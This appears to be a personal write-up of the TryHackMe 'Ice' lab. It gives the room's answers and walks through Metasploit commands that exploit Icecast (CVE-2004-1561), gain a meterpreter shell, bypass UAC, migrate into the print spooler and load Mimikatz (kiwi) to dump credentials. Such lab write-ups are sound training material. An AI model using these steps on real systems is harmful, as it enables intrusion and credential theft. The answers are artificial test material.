### Ice

export IP=10.10.69.208


Scan and enumerate our victim!


#### Recon

Deploy the machine! This may take up to three minutes to start.


Launch a scan against our target machine, I recommend using a SYN scan set to scan all ports on the machine. The scan command will be provided as a hint, however, it's recommended to complete the room 'Nmap' prior to this room. 


Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?
- 3389

![](../../img/Pasted%20image%2020220827082349.png)

What service did nmap identify as running on port 8000? (First word of this service)
- icecast

![](../../img/Pasted%20image%2020220827082402.png)

What does Nmap identify as the hostname of the machine? (All caps for the answer)
- DARK-PC

![](../../img/Pasted%20image%2020220827082429.png)


#### Gain Access

Exploit the target vulnerable service to gain a foothold!


Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What type of vulnerability is it? Use https://www.cvedetails.com for this question and the next.
- Execute CodeOverflow

What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
- CVE-2004-1561

![](../../img/Pasted%20image%2020220827185010.png)

Now that we've found our vulnerability, let's find our exploit. For this section of the room, we'll use the Metasploit module associated with this exploit. Let's go ahead and start Metasploit using the command `msfconsole`

![](../../img/Pasted%20image%2020220827185433.png)


After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? This module is also referenced in 'RP: Metasploit' which is recommended to be completed prior to this room, although not entirely necessary. 

![](../../img/Pasted%20image%2020220827185524.png)


Let's go ahead and select this module for use. Type either the command `use icecast` or `use 0` to select our search result.


Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?

![](../../img/Pasted%20image%2020220827185603.png)


First let's check that the LHOST option is set to our tun0 IP (which can be found on the access page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`

![](../../img/Pasted%20image%2020220827190045.png)

#### Escalate

Enumerate the machine and find potential privilege escalation paths to gain Admin powers!


Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?
- meterpreter

What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'RP: Metasploit' room.
- Dark


What build of Windows is the system?
- 7601
![](../../img/Pasted%20image%2020220827190156.png)


Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?
- x64


Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*

![](../../img/Pasted%20image%2020220827192856.png)


Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?
- exploit/windows/local/bypassuac_eventvwr


Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shell.



Go ahead and select our previously found local exploit for use using the command `use exploit/windows/local/bypassuac_eventvwr`


Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`


Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?
- LHOST

![](../../img/Pasted%20image%2020220827193105.png)


Set this option now. You might have to check your IP on the TryHackMe network using the command `ip addr`


After we've set this last option, we can now run our privilege escalation exploit. Run this now using the command `run`. Note, this might take a few attempts and you may need to relaunch the box and exploit the service in the case that this fails. 

![](../../img/Pasted%20image%2020220827193547.png)

#### Looting

Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't). 

![](../../img/Pasted%20image%2020220827193634.png)


In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?

Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell. 

![](../../img/Pasted%20image%2020220827193743.png)

Migrate to this process now with the command `migrate -N PROCESS_NAME`

![](../../img/Pasted%20image%2020220827194054.png)

Let's check what user we are now with the command `getuid`. What user is listed?
- NT AUTHORITY\SYSTEM

![](../../img/Pasted%20image%2020220827194126.png)


Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz)

![](../../img/Pasted%20image%2020220827194338.png)

